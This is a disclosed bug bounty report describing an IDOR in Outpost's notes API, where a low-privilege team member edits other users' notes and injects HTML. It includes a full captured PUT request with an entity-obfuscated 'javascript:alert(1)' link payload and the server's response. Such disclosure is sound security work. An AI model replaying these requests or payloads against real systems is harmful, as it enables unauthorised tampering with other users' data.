# IDOR on notes to HTML injection

## Report Details
- **Report ID**: 914331
- **URL**: https://hackerone.com/reports/914331
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-02T20:12:45.901Z
- **Disclosed**: 2020-11-26T03:37:41.122Z

## Reporter
- **Username**: ph-hitachi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: palo_alto_software

## Vulnerability Information
## Summary:
Team member with role USER can change notes of any users and also we able to inject some html tags 

## Steps To Reproduce:

  1. Login in with role `owner` create `note`
  1. login team member with  role `users`
  1. add `note` and capture with `burp suite` and change the uuid of `notes``


```
PUT /api/v1/note/b9db186a-c0af-462d-ad71-c30c2bfd7cf5 HTTP/1.1
Host: api.outpost.co
Connection: close
Content-Length: 102
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept: */*
Origin: https://app.outpost.co
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.outpost.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ru;q=0.8,th;q=0.7
Cookie:  <authentacation_cookies>

{"body":"<h1><a href=\"j&#97v&#97script&#x3A;&#97lert(1)\">This is a test</a></h1>","mentionUuids":[]}
```

### Response:
```json
{
  "body": "<h1><a href=\"j&amp;#97v&amp;#97script:&amp;#97lert%281%29\" rel=\"nofollow\">This is a test</a></h1>",
  "uuid": "b9db186a-c0af-462d-ad71-c30c2bfd7cf5",
  "conversationUuid": "78a8df65-aaa0-4384-9dfe-ab6120f3737f",
  "createdBy": {
    "uuid": "b065722c-09b4-45f2-8ee3-4a4a8a92080f",
    "displayName": "justin",
    "firstName": "justin",
    "lastName": "lee",
    "isDeleted": false,
    "gravatarHash": "630369207d5b093d4d57dcda07d6c22f",
    "avatarColor": "ORANGE"
  },
  "modifiedBy": {
    "uuid": "7d2f671b-ed97-4a2b-8bb3-8d7538e73e34",
    "displayName": "Attacker",
    "firstName": "Attacker",
    "lastName": "1",
    "isDeleted": false,
    "gravatarHash": "f33c9e2461140f5fd594a1870dfdf980",
    "avatarColor": "PURPLE"
  },
  "createdDate": 1593549551704,
  "modifiedDate": 1593719773232,
  "status": "DEFAULT"
}
```
{F891966}

## Impact

using this the user can edit any note of member or inject some malicious html content

## Attachments
- IDOR.PNG
- poc.png
